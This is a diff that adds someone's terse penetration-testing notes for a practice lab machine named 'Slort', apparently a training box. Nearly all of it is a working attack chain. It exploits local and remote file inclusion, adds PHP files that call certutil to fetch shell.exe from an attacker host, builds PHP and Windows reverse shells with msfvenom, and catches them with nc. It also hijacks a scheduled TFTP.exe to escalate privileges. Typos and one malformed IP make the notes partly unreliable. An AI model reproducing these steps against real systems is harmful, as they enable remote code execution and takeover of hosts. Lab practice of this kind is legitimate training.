@@ -1,0 +1,64 @@
+Slort 
+
+ 192.168.52.53
+ http://192.168.52.53:8080/dashboard/phpinfo.php
+ 	C:/xampp/htdocs 
+ 	 
+ 	
+ dirb http://192.168.52.53:8080
+ 	
+ http://192.168.52.53:8080/site
+ http://192.168.52.53:8080/site/index.php?page=main.php
+ LFI possible
+ 
+ http://192.168.52.53:8080/site/index.php?page=C:/xampp/htdocs/dashboard/phpinfo.php
+ and success
+Check for RFI
+echo "this is important file" >test.txt  
+python -m http.server 444
+
+http://1192.168.51.53:8080/site/index.php?page=http://192.168.49.51:8000/test.txt
+sucess
+Create two files 
+upload.php
+<?php 
+$download = system('certutil.exe -urlcache -split -f http://192.168.49.51:8000/shell.exe shell.exe', $val)
+?>
+
+                                                                    run.php                                                                             
+<?php
+$exec = system('shell.exe', $val)
+?>
+
+generate the shell
+
+msfvenom -p php/reverse_php
+
+ msfvenom -p php/reverse_php LHOST=192.168.49.51 LPORT=4444 -o exploit.php
+
+http://192.168.51.53:8080/site/index.php?page=http://192.168.49.51:8000/exploit.php
+nc -nvlp 4444
+Got shell
+cd C:\Backup
+echo "hello" > hello.txt (check permission for writing conentent.
+type info.txt
+TFTP.exe is running in every five munutes 
+cacls tftp.exe (Check ACL and permission)
+
+
+
+ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.51 LPORT=4445 -f exe -o rev.exe
+
+certutil -urlcache -split -f http://192.168.49.51:8000/rev.exe
+
+
+certutil -urlcache -split -f http://192.168.49.51:8000/winp.exe
+
+
+
+
+
+
+
+ 
+ 
